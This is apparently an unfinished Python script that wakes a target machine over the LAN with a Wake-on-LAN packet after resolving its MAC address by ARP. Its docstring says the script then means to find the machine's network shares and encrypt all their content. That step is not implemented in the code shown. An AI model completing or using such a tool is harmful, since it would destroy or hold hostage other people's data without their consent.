import sys
from wakeonlan import send_magic_packet
import ipaddress
import time
from pythonping import ping
'''
Simple and goofy Python script which exploits the Wake-On-LAN technology
to turn on a machine given its IP address:
first, it resolves the MAC address via ARP given the target's IP address,
then it sends a magic packet in order to switch on the machine.
To check if the target machine is awake and operating, it sends a ping request
until it receives feedback; at this point, it scouts for any folders and files shared
over the local network. If there are any, it encrypts all the content.
Wakie wakie!!
'''
import arp_test

print(sys.argv)
if len(sys.argv) != 2:
    sys.exit(2)
if isinstance(sys.argv[1], str):
    target_ip = ipaddress.ip_address(sys.argv[1])
    print('Target_IP found, equals: ' + sys.argv[1])
    target_mac = arp_test.arp_request(sys.argv[1])
    print('Target_MAC found, equals: ' + target_mac)
    send_magic_packet(target_mac)
    print('Magic_pkt sent, enjoy the magic.')  # this worked fine on Dec 26th, 2021
    time.sleep(30)  # waits for the target machine to boot
    
